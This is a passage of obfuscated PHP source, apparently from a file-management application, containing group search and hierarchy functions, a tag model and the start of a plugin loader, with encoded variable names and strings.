array_unique_by_key($šÆÀğÑ‰[$èò¥Õ[448]], $èò¥Õ[1402]); $šÆÀğÑ‰[$èò¥Õ[445]] = array($èò¥Õ[446] => count($šÆÀğÑ‰[$èò¥Õ[448]]), $èò¥Õ[442] => 20, $èò¥Õ[431] => 1, $èò¥Õ[447] => 1); return $šÆÀğÑ‰; } public function listSearchNow($‡¸¯ï¤ø) { $½ı®ÅÁ« =& $_SERVER[¼¥ÊĞÙÌ]; $íÆÜ—®û = trim($‡¸¯ï¤ø[$½ı®ÅÁ«[2090]]); $ÎøÑ¬Ô˜ = isset($‡¸¯ï¤ø[$½ı®ÅÁ«[2091]]) ? $‡¸¯ï¤ø[$½ı®ÅÁ«[2091]] : !1; if (!trim($íÆÜ—®û)) { return !1; } $íÆÜ—®û = str_replace($½ı®ÅÁ«[2092], $½ı®ÅÁ«[2093], $íÆÜ—®û); $¥êàĞ‰˜ = array($½ı®ÅÁ«[1402] => array($½ı®ÅÁ«[462], "{$íÆÜ—®û}\x25"), $½ı®ÅÁ«[32] => array($½ı®ÅÁ«[462], "\x25{$íÆÜ—®û}\45"), $½ı®ÅÁ«[1086] => $½ı®ÅÁ«[2094]); if ($ÎøÑ¬Ô˜) { $ ÃÃ€ƒ£ = $this->getInfoSimple($ÎøÑ¬Ô˜); $‘ášÁ¤Æ = $ ÃÃ€ƒ£[$½ı®ÅÁ«[589]] . $ÎøÑ¬Ô˜ . $½ı®ÅÁ«[621]; $¥êàĞ‰˜ = array($¥êàĞ‰˜, array($½ı®ÅÁ«[589] => array($½ı®ÅÁ«[462], $‘ášÁ¤Æ))); } $¥êàĞ‰˜ = $this->parseWhereLike($¥êàĞ‰˜); $ğ«ó€ = $this->_makeOrder()->where($¥êàĞ‰˜)->selectPage(20); $ğ«ó€ = $ğ«ó€ ? $ğ«ó€ : array($½ı®ÅÁ«[448] => array(), $½ı®ÅÁ«[445] => array()); if (!$ğ«ó€ || count($ğ«ó€[$½ı®ÅÁ«[448]]) < 5 && Input::check($íÆÜ—®û, $½ı®ÅÁ«[396])) { $ºŠµÒ­ò = $this->groupChildrenAll($ÎøÑ¬Ô˜); $Í¶“­” = $this->_searchFromMeta($½ı®ÅÁ«[540], $íÆÜ—®û, 10, $ºŠµÒ­ò); $¶ó‰ë»° = $this->_searchFromMeta($½ı®ÅÁ«[541], $íÆÜ—®û, 10, $ºŠµÒ­ò); $Àı¾µœ = array_merge($Í¶“­”, $¶ó‰ë»°, $ğ«ó€[$½ı®ÅÁ«[448]]); $ğ«ó€[$½ı®ÅÁ«[448]] = array_unique_by_key($Àı¾µœ, $½ı®ÅÁ«[1402]); $ğ«ó€[$½ı®ÅÁ«[445]][$½ı®ÅÁ«[446]] = count($ğ«ó€[$½ı®ÅÁ«[448]]); $ğ«ó€[$½ı®ÅÁ«[445]][$½ı®ÅÁ«[447]] = ceil($ğ«ó€[$½ı®ÅÁ«[445]][$½ı®ÅÁ«[446]] / $ğ«ó€[$½ı®ÅÁ«[445]][$½ı®ÅÁ«[442]]); } $this->_listDataApply($ğ«ó€[$½ı®ÅÁ«[448]]); return $ğ«ó€; } protected function groupChildrenAll($¯ŒØŸü³) { $¦Øä¸ï =& $_SERVER[¼¥ÊĞÙÌ]; if (!$¯ŒØŸü³) { return !1; } if (!is_array($¯ŒØŸü³)) { $¯ŒØŸü³ = array($¯ŒØŸü³); } $„µÕØÛØ = $¯ŒØŸü³; foreach ($¯ŒØŸü³ as $®òÜ ‡±) { $¾×¹Èäê = $this->getInfoSimple($®òÜ ‡±); $öÃµ˜á = array($¦Øä¸ï[589] => array($¦Øä¸ï[462], $¾×¹Èäê[$¦Øä¸ï[589]] . $®òÜ ‡± . $¦Øä¸ï[621])); $ ü¿ìôÌ = $this->field($¦Øä¸ï[1402])->where($öÃµ˜á)->select(); $„µÕØÛØ = array_merge($„µÕØÛØ, array_to_keyvalue($ ü¿ìôÌ, $¦Øä¸ï[12], $¦Øä¸ï[1402])); } return array_unique($„µÕØÛØ); } private function _searchFromMeta($Îİçª“, $ÙÑ™ñ˜ó, $Ÿ‡ÑÎŞğ, $Ê·…Êäá) { $üÀ±¢‡ı =& $_SERVER[¼¥ÊĞÙÌ]; $ÙÑ™ñ˜ó = strtolower($ÙÑ™ñ˜ó); $ÅÌñ ¨Â = array($üÀ±¢‡ı[97] => $Îİçª“, $üÀ±¢‡ı[453] => array($üÀ±¢‡ı[462], "\x25{$ÙÑ™ñ˜ó}\x25")); $ÅÌñ ¨Â = $this->parseWhereLike($ÅÌñ ¨Â); if ($Ê·…Êäá) { $ÅÌñ ¨Â[$üÀ±¢‡ı[1402]] = array($üÀ±¢‡ı[7], $Ê·…Êäá); } $é©ß§÷ = Model($üÀ±¢‡ı[2095])->where($ÅÌñ ¨Â)->limit($Ÿ‡ÑÎŞğ)->select(); if (!$é©ß§÷) { return array(); } $é©ß§÷ = array_to_keyvalue($é©ß§÷, $üÀ±¢‡ı[12], $üÀ±¢‡ı[1402]); $¾ŞòíØ = $this->where(array($üÀ±¢‡ı[2081] => array($üÀ±¢‡ı[7], $é©ß§÷)))->select(); if (!$¾ŞòíØ) { return array(); } return $¾ŞòíØ; } protected function _listDataApplyItem($•…¨ÅòÌ) { $ÄÙíÍé = array($•…¨ÅòÌ); $this->_listDataApply($ÄÙíÍé); return $ÄÙíÍé[0]; } protected function _listDataApply(&$Ù…±â¤³) { $ˆ¬•ïæÊ =& $_SERVER[¼¥ÊĞÙÌ]; if (!$Ù…±â¤³) { return; } $­œèë°½ = array_to_keyvalue($Ù…±â¤³, $ˆ¬•ïæÊ[12], $ˆ¬•ïæÊ[1402]); $this->_listAppendChildren($Ù…±â¤³); $this->_listAppendChildrenMember($Ù…±â¤³); $this->_listAppendMeta($Ù…±â¤³, $­œèë°½); $this->_listAppendParent($Ù…±â¤³); $this->_listAppendSourceRoot($Ù…±â¤³, $­œèë°½); } private function _listAppendChildren(&$çªê¦¯¾) { $²Ë¼×¾ =& $_SERVER[¼¥ÊĞÙÌ]; $ùÓêø®Ï = array_to_keyvalue($çªê¦¯¾, $²Ë¼×¾[12], $²Ë¼×¾[1402]); $ñšó¯ïµ = array($²Ë¼×¾[193] => array($²Ë¼×¾[7], $ùÓêø®Ï)); $àŠ Öş = array($²Ë¼×¾[193], $²Ë¼×¾[2096] => $²Ë¼×¾[570]); $÷Åœı® = $this->field($àŠ Öş)->where($ñšó¯ïµ)->group($²Ë¼×¾[193])->select(); $é’óóÉ• = array_to_keyvalue($÷Åœı®, $²Ë¼×¾[193], $²Ë¼×¾[570]); foreach ($çªê¦¯¾ as &$äÔİÎ©Á) { $·øşœ’ = $äÔİÎ©Á[$²Ë¼×¾[1402]]; $äÔİÎ©Á[$²Ë¼×¾[2097]] = isset($é’óóÉ•[$·øşœ’]) ? intval($é’óóÉ•[$·øşœ’]) : !1; } unset($äÔİÎ©Á); } private function _listAppendChildrenMember(&$¨£®šÙÆ) { $ß®ĞĞ§© =& $_SERVER[¼¥ÊĞÙÌ]; $èçíŸ€Â = array_to_keyvalue($¨£®šÙÆ, $ß®ĞĞ§©[12], $ß®ĞĞ§©[1402]); $¹á˜ù…¾ = array($ß®ĞĞ§©[1402] => array($ß®ĞĞ§©[7], $èçíŸ€Â)); $ìëÄ„¾ = array($ß®ĞĞ§©[1402], $ß®ĞĞ§©[2096] => $ß®ĞĞ§©[570]); $İ»ë¢ = Model($ß®ĞĞ§©[2086])->field($ìëÄ„¾)->where($¹á˜ù…¾)->group($ß®ĞĞ§©[1402])->select(); $îãôõ«‘ = array_to_keyvalue($İ»ë¢, $ß®ĞĞ§©[1402], $ß®ĞĞ§©[570]); foreach ($¨£®šÙÆ as &$“™¿óë‡) { $‰€›—«  = $“™¿óë‡[$ß®ĞĞ§©[1402]]; $“™¿óë‡[$ß®ĞĞ§©[2098]] = isset($îãôõ«‘[$‰€›—« ]) ? intval($îãôõ«‘[$‰€›—« ]) : !1; } unset($“™¿óë‡); } private function _listAppendMeta(&$…àÈÀûÁ, $®‡ï¶¶) { $º«Ñ˜­ =& $_SERVER[¼¥ÊĞÙÌ]; $²ú•‡¯ = array($º«Ñ˜­[1402] => array($º«Ñ˜­[7], $®‡ï¶¶)); $å¬÷Šµ¶ = Model($º«Ñ˜­[2085])->where($²ú•‡¯)->select(); $å¬÷Šµ¶ = array_to_keyvalue_group($å¬÷Šµ¶, $º«Ñ˜­[1402]); foreach ($å¬÷Šµ¶ as &$Ì›š‡Ğ) { $Ì›š‡Ğ = array_to_keyvalue($Ì›š‡Ğ, $º«Ñ˜­[97], $º«Ñ˜­[453]); } unset($Ì›š‡Ğ); foreach ($…àÈÀûÁ as &$÷¶Œ—•«) { $÷¶Œ—•«[$º«Ñ˜­[544]] = array(); if (isset($å¬÷Šµ¶[$÷¶Œ—•«[$º«Ñ˜­[1402]]])) { $÷¶Œ—•«[$º«Ñ˜­[544]] = $å¬÷Šµ¶[$÷¶Œ—•«[$º«Ñ˜­[1402]]]; } } unset($÷¶Œ—•«); } protected function parentLevelArray($òÅç²°) { $Å©²‰ùş =& $_SERVER[¼¥ÊĞÙÌ]; $òÅç²° = explode($Å©²‰ùş[50], trim($òÅç²°, $Å©²‰ùş[50])); $òÅç²° = array_remove_value($òÅç²°, $Å©²‰ùş[231]); return $òÅç²°; } protected function parentInGroup($ ‡¨ÍÀÒ, $±ô„·§) { $ë˜åŞŸ =& $_SERVER[¼¥ÊĞÙÌ]; $¤²ÄÌèå = $this->getInfoSimple($ ‡¨ÍÀÒ); if (!$¤²ÄÌèå) { return !0; } $Íª¢×Ÿ• = $this->parentLevelArray($¤²ÄÌèå[$ë˜åŞŸ[589]]); $Íª¢×Ÿ•[] = $ ‡¨ÍÀÒ; foreach ($Íª¢×Ÿ• as $ ‡¨ÍÀÒ) { if (in_array($ ‡¨ÍÀÒ . $ë˜åŞŸ[12], $±ô„·§)) { return !0; } } return !1; } private function _listAppendParent(&$¸ÌÊÊ–ò) { $ä¿¾š€» =& $_SERVER[¼¥ÊĞÙÌ]; $´ºáäÎ‘ = array(); foreach ($¸ÌÊÊ–ò as &$…’»õÕ) { $´ºáäÎ‘[$…’»õÕ[$ä¿¾š€»[1402]]] = $…’»õÕ[$ä¿¾š€»[32]]; $„»Æ²õ³ = $this->parentLevelArray($…’»õÕ[$ä¿¾š€»[589]]); foreach ($„»Æ²õ³ as $İ™Œèı) { if (!isset($´ºáäÎ‘[$İ™Œèı])) { $´ºáäÎ‘[$İ™Œèı] = 0; } } } unset($…’»õÕ); foreach ($´ºáäÎ‘ as $¥Ú®áˆê => $è´‘¨·³) { if ($è´‘¨·³) { continue; } $ö«è—ºÌ = $this->getInfoSimple($¥Ú®áˆê); $´ºáäÎ‘[$¥Ú®áˆê] = $ö«è—ºÌ[$ä¿¾š€»[32]]; } $ÈØ­Ğ‘Â = $GLOBALS[$ä¿¾š€»[6]][$ä¿¾š€»[92]][$ä¿¾š€»[2099]]; if (KodUser::isRoot()) { $ÈØ­Ğ‘Â = !1; } foreach ($¸ÌÊÊ–ò as &$…’»õÕ) { $„»Æ²õ³ = $this->parentLevelArray($…’»õÕ[$ä¿¾š€»[589]]); $÷Ó¦ºª = $ä¿¾š€»[12]; foreach ($„»Æ²õ³ as $¥Ú®áˆê => $İ™Œèı) { if ($ÈØ­Ğ‘Â && $¥Ú®áˆê == 0) { continue; } $÷Ó¦ºª .= $´ºáäÎ‘[$İ™Œèı] . $ä¿¾š€»[8]; } if ($„»Æ²õ³) { $÷Ó¦ºª .= $…’»õÕ[$ä¿¾š€»[32]]; } $…’»õÕ[$ä¿¾š€»[594]] = str_replace($ä¿¾š€»[257], $ä¿¾š€»[8], $÷Ó¦ºª); } unset($…’»õÕ); } private function _listAppendSourceRoot(&$À­Î‘¤, $ÓøÒƒï) { $äŒ½Â¬Õ =& $_SERVER[¼¥ÊĞÙÌ]; $³²–‹Æƒ = Model($äŒ½Â¬Õ[904])->listSourceRoot(SourceModel::TYPE_GROUP, $ÓøÒƒï); $³²–‹Æƒ = array_to_keyvalue($³²–‹Æƒ, $äŒ½Â¬Õ[574]); $³²–‹Æƒ = array_remove_key($³²–‹Æƒ, $äŒ½Â¬Õ[574]); foreach ($À­Î‘¤ as &$°¿¹¡×õ) { $°¿¹¡×õ[$äŒ½Â¬Õ[90]] = $³²–‹Æƒ[$°¿¹¡×õ[$äŒ½Â¬Õ[1402]]] ? $³²–‹Æƒ[$°¿¹¡×õ[$äŒ½Â¬Õ[1402]]] : array(); } unset($°¿¹¡×õ); } protected function groupMerge($ô™áĞØÌ) { $ô™áĞØÌ = array_values(array_unique($ô™áĞØÌ)); $º§øì¨• = array(); for ($“šƒÍ = 0; $“šƒÍ < count($ô™áĞØÌ); $“šƒÍ++) { $ŠÎŠÌü = !1; for ($ò·–œ‚ = 0; $ò·–œ‚ < count($ô™áĞØÌ); $ò·–œ‚++) { if ($“šƒÍ == $ò·–œ‚) { continue; } if ($this->isParentOf($ô™áĞØÌ[$ò·–œ‚], $ô™áĞØÌ[$“šƒÍ])) { $ŠÎŠÌü = !0; break; } } if (!$ŠÎŠÌü) { $º§øì¨•[] = $ô™áĞØÌ[$“šƒÍ]; } } return $º§øì¨•; } protected function isParentOf($ı™¡ÎÓ, $ë›ØÙ›€) { $¦±„ú‚ô =& $_SERVER[¼¥ÊĞÙÌ]; if (!$ı™¡ÎÓ || !$ë›ØÙ›€ || $ı™¡ÎÓ == $ë›ØÙ›€) { return !1; } $×ó®‡§ = $this->getInfoSimple($ı™¡ÎÓ); $ÜÀÅÌ®Ê = $this->getInfoSimple($ë›ØÙ›€); $™ÎÁÏº¢ = $×ó®‡§[$¦±„ú‚ô[589]] . $ı™¡ÎÓ . $¦±„ú‚ô[50]; if (substr($ÜÀÅÌ®Ê[$¦±„ú‚ô[589]], 0, strlen($™ÎÁÏº¢)) == $™ÎÁÏº¢) { return !0; } return !1; } public function groupShowRoot($ˆõ¹­˜¶, $ê³¶¬ = false) { $ö×¢Àî„ =& $_SERVER[¼¥ÊĞÙÌ]; $õïµÏõ = $this->getInfo($ˆõ¹­˜¶); if (!$õïµÏõ) { return array(); } $Àæ™ö‚ğ = $this->parentLevelArray($õïµÏõ[$ö×¢Àî„[589]]); $ÈÓ÷Å•ò = array($ˆõ¹­˜¶); if (count($Àæ™ö‚ğ) == 0) { return $ÈÓ÷Å•ò; } if ($ê³¶¬ && count($Àæ™ö‚ğ) == 1) { return $ÈÓ÷Å•ò; } if (!$õïµÏõ[$ö×¢Àî„[544]] || !isset($õïµÏõ[$ö×¢Àî„[544]][$ö×¢Àî„[2082]]) || $õïµÏõ[$ö×¢Àî„[544]][$ö×¢Àî„[2082]] == $ö×¢Àî„[850]) { return $this->groupShowRoot($Àæ™ö‚ğ[count($Àæ™ö‚ğ) - 1], $ê³¶¬); } if ($õïµÏõ[$ö×¢Àî„[544]][$ö×¢Àî„[2082]] == $ö×¢Àî„[435]) { $ÄöÛæìŠ = explode($ö×¢Àî„[50], $õïµÏõ[$ö×¢Àî„[544]][$ö×¢Àî„[2083]]); if ($ÄöÛæìŠ) { $ÈÓ÷Å•ò = array_merge($ÈÓ÷Å•ò, $ÄöÛæìŠ); } } return $ÈÓ÷Å•ò; } protected function resetParentLevel() { $òıšá°Û =& $_SERVER[¼¥ÊĞÙÌ]; $–ışê¾Ã = $òıšá°Û[1402]; $ÆÕèÅ = $this->select(); $ÆÕèÅ = array_to_keyvalue($ÆÕèÅ, $–ışê¾Ã); foreach ($ÆÕèÅ as $â’ˆÆÉ›) { $¦¾Û§ºå = $â’ˆÆÉ›; $ÅÏ…µ‹á = array(); while ($¦¾Û§ºå[$òıšá°Û[193]] != 0) { $ÅÏ…µ‹á[] = $¦¾Û§ºå[$òıšá°Û[193]]; $¦¾Û§ºå = $ÆÕèÅ[$¦¾Û§ºå[$òıšá°Û[193]]]; } $ÅÏ…µ‹á[] = 0; $ÅÏ…µ‹á = $òıšá°Û[50] . implode($òıšá°Û[50], array_reverse($ÅÏ…µ‹á)) . $òıšá°Û[50]; $this->setNamePinyin($â’ˆÆÉ›[$–ışê¾Ã], $â’ˆÆÉ›[$òıšá°Û[32]]); $this->where(array($–ışê¾Ã => $â’ˆÆÉ›[$–ışê¾Ã]))->save(array($òıšá°Û[660] => $ÅÏ…µ‹á)); } return $ÆÕèÅ; } public function groupNameAuto($ìí¯Ü¦ü, $ÔÅ‚İã) { $ğƒú–ğà =& $_SERVER[¼¥ÊĞÙÌ]; $ÓÇüÊå = $this->where(array($ğƒú–ğà[480] => $ìí¯Ü¦ü))->getField($ğƒú–ğà[32], !0); if (!$ÓÇüÊå || !in_array($ÔÅ‚İã, $ÓÇüÊå)) { return $ÔÅ‚İã; } for ($Ïİà™§ş = 1; $Ïİà™§ş <= count($ÓÇüÊå) + 1; $Ïİà™§ş++) { $åôİ†ß¿ = $ÔÅ‚İã . "\x28{$Ïİà™§ş}\51"; if (!in_array($åôİ†ß¿, $ÓÇüÊå)) { return $åôİ†ß¿; } } } public function groupSwitch($Ê×§ºÖ¡, $•ü´ËÄ) { $Ùß¸¯ª =& $_SERVER[¼¥ÊĞÙÌ]; $§â³ˆÜ = array($Ùß¸¯ª[1402] => array($Ùß¸¯ª[7], array($Ê×§ºÖ¡, $•ü´ËÄ))); $¥íÖñ¤ = $this->where($§â³ˆÜ)->select(); $¥íÖñ¤ = array_to_keyvalue($¥íÖñ¤, $Ùß¸¯ª[1402]); if (!isset($¥íÖñ¤[$Ê×§ºÖ¡]) || !isset($¥íÖñ¤[$•ü´ËÄ]) || $¥íÖñ¤[$Ê×§ºÖ¡][$Ùß¸¯ª[193]] == 0) { return !1; } $§â³ˆÜ = array($Ùß¸¯ª[1402] => $Ê×§ºÖ¡); $ÑÃàÂøá = Model($Ùß¸¯ª[2086])->where($§â³ˆÜ)->select(); if (!$ÑÃàÂøá) { $ÑÃàÂøá = array(); } foreach ($ÑÃàÂøá as $†®ØÁ›) { $¸Š¶½æÔ = $†®ØÁ›[$Ùß¸¯ª[1790]]; $§â³ˆÜ = array($Ùß¸¯ª[1790] => $¸Š¶½æÔ, $Ùß¸¯ª[1402] => $•ü´ËÄ); $ş»¦ÕÒã = Model($Ùß¸¯ª[2086])->where($§â³ˆÜ)->find(); if (!$ş»¦ÕÒã) { $˜˜„Öƒ = array($•ü´ËÄ => $†®ØÁ›[$Ùß¸¯ª[2100]]); Model($Ùß¸¯ª[602])->userGroupAdd($¸Š¶½æÔ, $˜˜„Öƒ); } Model($Ùß¸¯ª[602])->userGroupRemove($¸Š¶½æÔ, $Ê×§ºÖ¡); } $§â³ˆÜ = array($Ùß¸¯ª[191] => 2, $Ùß¸¯ª[193] => 0, $Ùß¸¯ª[488] => 1, $Ùß¸¯ª[574] => array($Ùß¸¯ª[7], array($Ê×§ºÖ¡, $•ü´ËÄ))); $“ŒÕÛ¥Ã = Model($Ùß¸¯ª[904])->where($§â³ˆÜ)->field($Ùß¸¯ª[2101])->select(); $“ŒÕÛ¥Ã = array_to_keyvalue($“ŒÕÛ¥Ã, $Ùß¸¯ª[574], $Ùß¸¯ª[194]); $ş±ã”Ç = !empty($“ŒÕÛ¥Ã[$Ê×§ºÖ¡]) ? $“ŒÕÛ¥Ã[$Ê×§ºÖ¡] : !1; if ($ş±ã”Ç) { if (!$“ŒÕÛ¥Ã[$•ü´ËÄ]) { $“ŒÕÛ¥Ã[$•ü´ËÄ] = Model($Ùß¸¯ª[904])->groupRootAdd($•ü´ËÄ); } $×œ½‰Šò = $“ŒÕÛ¥Ã[$•ü´ËÄ]; $§â³ˆÜ = array($Ùß¸¯ª[193] => $ş±ã”Ç); $“ŒÕÛ¥Ã = Model($Ùß¸¯ª[904])->where($§â³ˆÜ)->field($Ùß¸¯ª[2102])->select(); if (!$“ŒÕÛ¥Ã) { $“ŒÕÛ¥Ã = array(); } Model($Ùß¸¯ª[904])->moveClearAuth = !1; foreach ($“ŒÕÛ¥Ã as $˜ò•ëù’) { $³İË½¯ = $˜ò•ëù’[$Ùß¸¯ª[488]] == $Ùß¸¯ª[91] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($Ùß¸¯ª[904])->move($˜ò•ëù’[$Ùß¸¯ª[194]], $×œ½‰Šò, $³İË½¯); } Model($Ùß¸¯ª[904])->moveClearAuth = !0; $§â³ˆÜ = array($Ùß¸¯ª[191] => 2, $Ùß¸¯ª[574] => $Ê×§ºÖ¡); $á¿¢Åİ = array($Ùß¸¯ª[574] => $•ü´ËÄ); Model($Ùß¸¯ª[2103])->where($§â³ˆÜ)->save($á¿¢Åİ); Model($Ùß¸¯ª[2104])->where($§â³ˆÜ)->save($á¿¢Åİ); } $this->_changeChildLevel($¥íÖñ¤[$Ê×§ºÖ¡], $¥íÖñ¤[$•ü´ËÄ], !0); $this->where(array($Ùß¸¯ª[193] => $Ê×§ºÖ¡))->save(array($Ùß¸¯ª[193] => $•ü´ËÄ)); $this->_clearChildrenCache($¥íÖñ¤[$•ü´ËÄ]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\x75\163\145\x72\x5f\x66\141\166"; protected function cacheFunctionAlias($¤ÉÏõÀŒ) { $ÊÑŞûå =& $_SERVER[¼¥ÊĞÙÌ]; return array($ÊÑŞûå[2105] => array($¤ÉÏõÀŒ[0], $ÊÑŞûå[2106]), $ÊÑŞûå[2107] => array($¤ÉÏõÀŒ[0], $ÊÑŞûå[2108])); } protected function get($“‡¸ë¿) { $ĞŒ×Ò¢¿ =& $_SERVER[¼¥ÊĞÙÌ]; $™ğºÚ­Ú = Model($ĞŒ×Ò¢¿[590])->metaGet($“‡¸ë¿, $ĞŒ×Ò¢¿[2109]); $ğÜ×Õá¾ = json_decode($™ğºÚ­Ú, !0); return $ğÜ×Õá¾ ? $ğÜ×Õá¾ : array($ĞŒ×Ò¢¿[2110] => $ĞŒ×Ò¢¿[91], $ĞŒ×Ò¢¿[448] => array()); } protected function set($Ÿµï«•, $ÂÔß§Æ) { $Œ¯ÆğÃÃ =& $_SERVER[¼¥ÊĞÙÌ]; $ÂÔß§Æ = $ÂÔß§Æ ? $ÂÔß§Æ : array($Œ¯ÆğÃÃ[2110] => $Œ¯ÆğÃÃ[91], $Œ¯ÆğÃÃ[448] => array()); return Model($Œ¯ÆğÃÃ[590])->metaSet($Ÿµï«•, $Œ¯ÆğÃÃ[2109], json_encode($ÂÔß§Æ)); } protected function getByTagID($ˆù‚Š‡­, $·şæöä˜) { $·æùÎê =& $_SERVER[¼¥ÊĞÙÌ]; if (!$ˆù‚Š‡­ || !$·şæöä˜) { return !1; } if (!Model($·æùÎê[590])->getInfoSimple($ˆù‚Š‡­)) { return !1; } $ Âƒâó = $this->get($ˆù‚Š‡­); if (!$ Âƒâó || !isset($ Âƒâó[$·æùÎê[448]])) { return !1; } $¦Ğù—¿ = array_find_by_field($ Âƒâó[$·æùÎê[448]], $·æùÎê[478], $·şæöä˜); return is_array($¦Ğù—¿) ? $¦Ğù—¿ : !1; } public function listSource($öË†×²İ, $¶•Í«ªë) { $€ çãŒ =& $_SERVER[¼¥ÊĞÙÌ]; if ($¶•Í«ªë && !is_array($¶•Í«ªë)) { $¶•Í«ªë = array($¶•Í«ªë); } $Á‰îÛü© = $this->listData($öË†×²İ); $™Ê•à© = array(); foreach ($Á‰îÛü© as $õÌŞ¬à¾) { $ôä™–ÙÔ = $õÌŞ¬à¾[$€ çãŒ[87]]; if (!$ôä™–ÙÔ) { continue; } if (!isset($™Ê•à©[$ôä™–ÙÔ])) { $™Ê•à©[$ôä™–ÙÔ] = array(); } $™Ê•à©[$ôä™–ÙÔ][] = $õÌŞ¬à¾[$€ çãŒ[503]]; } $ò©ƒËûí = array(); foreach ($™Ê•à© as $–ÌŠ…Œ => $Ó·ÏïÛµ) { $²ÃŸ­ù‘ = !0; if (!$¶•Í«ªë) { $ò©ƒËûí[] = $–ÌŠ…Œ; continue; } foreach ($¶•Í«ªë as $Êò’ŞÙé) { if (!in_array($Êò’ŞÙé, $Ó·ÏïÛµ)) { $²ÃŸ­ù‘ = !1; break; } } if ($²ÃŸ­ù‘) { $ò©ƒËûí[] = $–ÌŠ…Œ; } } if (!$ò©ƒËûí) { return array(); } $“§„ü¡Ø = array($€ çãŒ[494] => array($€ çãŒ[495], $ò©ƒËûí), $€ çãŒ[574] => $öË†×²İ, $€ çãŒ[191] => SourceModel::TYPE_GROUP); $óÜß Ÿ¥ = Model($€ çãŒ[1440])->listSource($“§„ü¡Ø); if (!$óÜß Ÿ¥ || count($ò©ƒËûí) == $óÜß Ÿ¥[$€ çãŒ[445]][$€ çãŒ[446]]) { return $óÜß Ÿ¥; } $ƒÏ•Ûæ = array(); $Ìù…Ì²ò = array_to_keyvalue($óÜß Ÿ¥[$€ çãŒ[85]], $€ çãŒ[12], $€ çãŒ[194]); $ Ûæ¯Ôğ = array_to_keyvalue($óÜß Ÿ¥[$€ çãŒ[86]], $€ çãŒ[12], $€ çãŒ[194]); $¢ºíšƒ = array_merge($ Ûæ¯Ôğ, $Ìù…Ì²ò); foreach ($ò©ƒËûí as $ôä™–ÙÔ) { if (!in_array($ôä™–ÙÔ, $¢ºíšƒ)) { $ƒÏ•Ûæ[] = $ôä™–ÙÔ; } } if ($ƒÏ•Ûæ) { $this->removeBySource($öË†×²İ, $ƒÏ•Ûæ); } return $óÜß Ÿ¥; } protected function listData($Ä‡ñöÅˆ) { $¬¶øÂä =& $_SERVER[¼¥ÊĞÙÌ]; $ŞğÄÆš× = array($¬¶øÂä[1781] => 0, $¬¶øÂä[562] => array($¬¶øÂä[2111], 0), $¬¶øÂä[499] => $¬¶øÂä[1398] . $Ä‡ñöÅˆ); $åáà™ñ¶ = $¬¶øÂä[2112]; $ãş€‘Š = $this->field($åáà™ñ¶)->where($ŞğÄÆš×)->order($¬¶øÂä[2113])->select(); return $ãş€‘Š ? $ãş€‘Š : array(); } protected function addToTag($ıİ®·ªÈ, $¾ÕÅ”ÅÆ, $¤µ”êÃé) { $á¤±†Ïï =& $_SERVER[¼¥ÊĞÙÌ]; if (!$this->getByTagID($ıİ®·ªÈ, $¤µ”êÃé) || !$¾ÕÅ”ÅÆ) { return !1; } if (!Model($á¤±†Ïï[904])->pathInfo($¾ÕÅ”ÅÆ)) { return !1; } $Ğæ–ç³¨ = array($á¤±†Ïï[1781] => 0, $á¤±†Ïï[562] => $¤µ”êÃé, $á¤±†Ïï[498] => $¾ÕÅ”ÅÆ, $á¤±†Ïï[499] => $á¤±†Ïï[2114] . $ıİ®·ªÈ, $á¤±†Ïï[497] => $á¤±†Ïï[12], $á¤±†Ïï[1995] => 0); if ($this->where($Ğæ–ç³¨)->find()) { return !1; } return $this->add($Ğæ–ç³¨); } protected function removeFromTag($…ë¤…§¥, $§Ï€±Â°, $¦œİš) { $É¡’ÌĞ =& $_SERVER[¼¥ÊĞÙÌ]; if (!$this->getByTagID($…ë¤…§¥, $¦œİš) || !$§Ï€±Â°) { return !1; } if (is_array($§Ï€±Â°)) { $§Ï€±Â° = array($É¡’ÌĞ[7], $§Ï€±Â°); } $»Óƒ›À¸ = array($É¡’ÌĞ[1781] => 0, $É¡’ÌĞ[562] => $¦œİš, $É¡’ÌĞ[499] => $É¡’ÌĞ[2114] . $…ë¤…§¥, $É¡’ÌĞ[498] => $§Ï€±Â°); return $this->where($»Óƒ›À¸)->delete(); } protected function removeByTag($É˜Õûªá, $ÜÓ ­®â) { $Ğ‘Ëµ =& $_SERVER[¼¥ÊĞÙÌ]; if (!$this->getByTagID($É˜Õûªá, $ÜÓ ­®â)) { return !1; } $ï¯ø”Ş = array($Ğ‘Ëµ[1781] => 0, $Ğ‘Ëµ[562] => $ÜÓ ­®â, $Ğ‘Ëµ[499] => $Ğ‘Ëµ[2114] . $É˜Õûªá); return $this->where($ï¯ø”Ş)->delete(); } protected function removeBySource($Á¥®Û‡û, $ÊÈÄ—µ•) { $êÖäÜ­¹ =& $_SERVER[¼¥ÊĞÙÌ]; if (!$Á¥®Û‡û || !$ÊÈÄ—µ•) { return !1; } if (is_array($ÊÈÄ—µ•)) { $ÊÈÄ—µ• = array($êÖäÜ­¹[7], $ÊÈÄ—µ•); } $çÖØıÇ‚ = array($êÖäÜ­¹[1781] => 0, $êÖäÜ­¹[498] => $ÊÈÄ—µ•, $êÖäÜ­¹[562] => array($êÖäÜ­¹[1100], 0), $êÖäÜ­¹[499] => $êÖäÜ­¹[2114] . $Á¥®Û‡û); return $this->where($çÖØıÇ‚)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\145\155\56\x70\154\165\x67\151\x6e\x4c\151\x73\164"; public $field = array("\156\141\x6d\x65", "\163\164\141\164\x75\163", "\162\x65\147\151\x65\x73\x74", "\143\x6f\x6e\146\151\x67"); public function loadList($øßşŒ‡ = false) { $Ú¡¬€§Â = array_to_keyvalue($this->listData(), $_SERVER[¼¥ÊĞÙÌ][32]); if ($øßşŒ‡) { return $Ú¡¬€§Â[$øßşŒ‡]; } return $Ú¡¬€§Â; } public function init() { $™ïºŞöÚ =& $_SERVER[¼¥ÊĞÙÌ]; Hook::trigger($™ïºŞöÚ[2115]); $Ì¦„®Èó = $this->loadPluginList(); foreach ($Ì¦„®Èó as $Ÿİ•Ù†ß => $ı¶—ğĞâ) { $Ó´Àƒ´Æ = $this->appAllow($Ÿİ•Ù†ß, $ı¶—ğĞâ); if (!$Ó´Àƒ´Æ) { continue; } foreach ($ı¶—ğĞâ[$™ïºŞöÚ[2116]] as $ı›¤ĞÉ¡ => $Ò›ÖĞÃï) { Hook::bind($ı›¤ĞÉ¡, $Ò›ÖĞÃï); } } Hook::trigger($™ïºŞöÚ[2117]); Hook::trigger(ACTION); } public function appAllow($¡Ì¡šÁ, 